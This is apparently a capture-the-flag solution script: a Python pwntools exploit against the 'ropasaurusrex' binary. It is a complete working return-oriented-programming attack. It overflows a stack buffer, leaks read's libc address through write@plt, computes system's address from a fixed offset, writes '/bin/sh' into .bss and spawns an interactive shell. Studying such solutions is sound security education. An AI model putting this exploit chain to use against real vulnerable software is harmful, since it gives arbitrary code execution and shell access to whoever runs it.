#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
conn = process("./ropasaurusrex")

main_addr = 0x804841d
read_plt = 0x804832c
write_plt = 0x804830c
pppr = 0x80484b6

read_got = 0x804961c
write_got = 0x8049614
bss = 0x8049628

payload  = "A"*0x88		   #buf
payload += p32(0xdeadbeef) #sfp
# write stdout , read's address
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# bss <- "/bin/sh" : read stdin
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
payload += p32(main_addr)

conn.sendline(payload)

read_addr = u32(conn.recv(4))
system_addr = read_addr - 0x9ad60
log.info("read_address   : 0x%x" % read_addr)
log.info("system_address : 0x%x" % system_addr)

# read(0, bss, 4)  <- "/bin/sh\x00"
conn.send("/bin/sh\x00")

payload  = "A"*0x88		   #buf
payload += p32(0xdeadbeef) #sfp
# system("/bin/sh")
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(bss)

conn.sendline(payload)
conn.interactive()



